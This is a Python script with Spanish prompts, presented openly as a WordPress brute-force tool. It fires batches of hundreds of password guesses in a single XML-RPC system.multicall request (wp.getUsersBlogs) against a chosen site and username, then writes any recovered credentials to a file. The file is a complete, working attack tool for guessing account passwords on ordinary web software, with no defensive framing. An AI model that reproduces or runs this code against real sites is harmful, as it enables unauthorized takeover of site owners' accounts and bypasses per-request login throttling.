import requests
import time
import os
from colorama import Fore, Style, init
from urllib.parse import urlparse
import stat

init(autoreset=True)

def create_attempt_counter():
    """Crea un contador de intentos de contraseñas.
    Devuelve dos funciones: `increment()` para sumar intentos y `total()` para obtener el total actual.
    """
    count = 0

    def increment(n: int = 1) -> int:
        nonlocal count
        count += n
        return count

    def total() -> int:
        return count

    return increment, total

def print_banner():
    """Imprime el banner de inicio"""
    banner = f"""
{Fore.RED}
 ██╗    ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗███████╗███████╗
 ██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝
 ██║ █╗ ██║██║   ██║██████╔╝██████╔╝██████╔╝███████╗███████╗███████╗
 ██║███╗██║██║   ██║██╔══██╗██╔═══╝ ██╔══██╗╚════██║╚════██║╚════██║
 ╚███╔███╝╚██████╔╝██║  ██║██║     ██║  ██║███████║███████║███████║
  ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
{Fore.YELLOW}
 ╔═══════════════════════════════════════════════════════════════╗
 ║{Fore.CYAN}     XML-RPC MULTI-CALL ATTACK SYSTEM v1.0{Fore.YELLOW}                     ║                                                      
 ║{Fore.WHITE}      WordPress Brute Force Exploitation Tool{Fore.YELLOW}                  ║                       
 ╠═══════════════════════════════════════════════════════════════╣
 ║{Fore.LIGHTMAGENTA_EX}  ⚡ Created by: b3rd3{Fore.YELLOW}                                         ║                           
 ║{Fore.LIGHTGREEN_EX}  🔓 Attack Type: XML-RPC System.Multicall{Fore.YELLOW}                     ║             
 ║{Fore.LIGHTCYAN_EX}  ⚙️  Method: Parallel Password Batching{Fore.YELLOW}                        ║
 ╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}                  
    """
    print(banner)

def get_user_input():
    """Obtiene el target URL y el batch size del usuario"""
    print_banner()
    
    target_url = input(f"{Fore.CYAN}[+] Ingresa la URL target (ej: https://example.com/xmlrpc.php): {Style.RESET_ALL}").strip()
    if not target_url:
        print(f"{Fore.RED}[-] URL no válida. Abortando...{Style.RESET_ALL}")
        exit(1)
    
    try:
        parsed = urlparse(target_url)
        if parsed.scheme not in ['http', 'https']:
            print(f"{Fore.YELLOW}[!] Advertencia: URL debe ser HTTP/HTTPS{Style.RESET_ALL}")
            target_url = 'https://' + target_url if '://' not in target_url else target_url
    except Exception as e:
        print(f"{Fore.RED}[-] URL inválida: {e}{Style.RESET_ALL}")
        exit(1)
    
    username = input(f"{Fore.CYAN}[+] Ingresa el nombre de usuario a atacar: {Style.RESET_ALL}").strip()
    if not username:
        print(f"{Fore.RED}[-] Usuario no válido. Abortando...{Style.RESET_ALL}")
        exit(1)
    
    dictionary_path = input(f"{Fore.CYAN}[+] Ingresa la ruta del diccionario: {Style.RESET_ALL}").strip()
    
    dictionary_path = os.path.abspath(dictionary_path)
    if not os.path.isfile(dictionary_path):
        print(f"{Fore.RED}[-] Archivo no encontrado o no es un archivo: {dictionary_path}{Style.RESET_ALL}")
        exit(1)
    
    if not os.access(dictionary_path, os.R_OK):
        print(f"{Fore.RED}[-] No tienes permisos de lectura: {dictionary_path}{Style.RESET_ALL}")
        exit(1)
    
    print(f"\n{Fore.YELLOW}[*] Elige el tamaño del lote:{Style.RESET_ALL}")
    batch_options = {
        "1": 100,
        "2": 200,
        "3": 300,
        "4": 400,
        "5": 500
    }
    
    for key, value in batch_options.items():
        print(f"    {key}. {value} passwords por lote")
    
    choice = input(f"\n{Fore.CYAN}[+] Selecciona una opción (1-5): {Style.RESET_ALL}").strip()
    
    if choice not in batch_options:
        print(f"{Fore.RED}[-] Opción no válida. Usando valor por defecto (500)...{Style.RESET_ALL}")
        batch_size = 500
    else:
        batch_size = batch_options[choice]
    
    print(f"\n{Fore.GREEN}[✓] Configuración establecida:{Style.RESET_ALL}")
    print(f"    URL: {target_url}")
    print(f"    Usuario: {username}")
    print(f"    Diccionario: {dictionary_path}")
    print(f"    Lote: {batch_size} passwords\n")
    
    return target_url, username, dictionary_path, batch_size

def send_batch(url, user, pwd_list):
    user_clean = user.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
    
    xml = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
    for pwd in pwd_list:
        pwd_clean = pwd.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        xml += f'''
        <value><struct>
            <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
            <member><name>params</name><value><array><data>
                <value><string>{user_clean}</string></value>
                <value><string>{pwd_clean}</string></value>
            </data></array></value></member>
        </struct></value>'''
    xml += '</data></array></value></param></params></methodCall>'
    
    headers = {'Content-Type': 'text/xml'}
    try:
        response = requests.post(url, data=xml, headers=headers, timeout=10)
        return response.text
    except Exception as e:
        print(f"{Fore.RED}[-] Error de conexión: {e}{Style.RESET_ALL}")
        return None

def main():
    url, username, dictionary_path, batch_size = get_user_input()
    
    print(f"{Fore.YELLOW}[*] Iniciando ataque contra {username} en {url}...{Style.RESET_ALL}\n")
    current_batch = []
    increment_attempt, total_attempts = create_attempt_counter()
    
    try:
        with open(dictionary_path, 'r', encoding='latin-1') as f:
            for line in f:
                password = line.strip()
                if not password: 
                    continue
                
                current_batch.append(password)
                increment_attempt(1)
                
                if len(current_batch) >= batch_size:
                    result = send_batch(url, username, current_batch)
                    
                    if result and 'isAdmin' in result: 
                        print(f"{Fore.GREEN}[!] ¡ÉXITO POTENCIAL! Credenciales encontradas:{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    Usuario: {username}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    Contraseña: {'*' * len(password)} ({len(password)} caracteres){Style.RESET_ALL}")
                        with open("resultado_exitoso.txt", "w") as out:
                            out.write(f"Usuario: {username}\nPassword: {password}\n\nRespuesta del servidor:\n{result}")
                        os.chmod("resultado_exitoso.txt", stat.S_IRUSR | stat.S_IWUSR)
                        break
                    
                    print(f"{Fore.CYAN}[+] Lote enviado ({len(current_batch)} passwords). "
                          f"Total probadas: {total_attempts()}. "
                          f"Última: {password}{Style.RESET_ALL}")
                    current_batch = []
                    time.sleep(1)
        
        if current_batch:
            result = send_batch(url, username, current_batch)
            if result and 'isAdmin' in result:
                print(f"{Fore.GREEN}[!] ¡ÉXITO POTENCIAL! Credenciales encontradas:{Style.RESET_ALL}")
                print(f"{Fore.GREEN}    Usuario: {username}{Style.RESET_ALL}")
                with open("resultado_exitoso.txt", "w") as out:
                    out.write(result)
                os.chmod("resultado_exitoso.txt", stat.S_IRUSR | stat.S_IWUSR)
        
        print(f"\n{Fore.YELLOW}[*] Ataque completado. Total de passwords probadas: {total_attempts()}{Style.RESET_ALL}")
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Ataque interrumpido por el usuario.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error durante el ataque: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Programa terminado.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error fatal: {e}{Style.RESET_ALL}")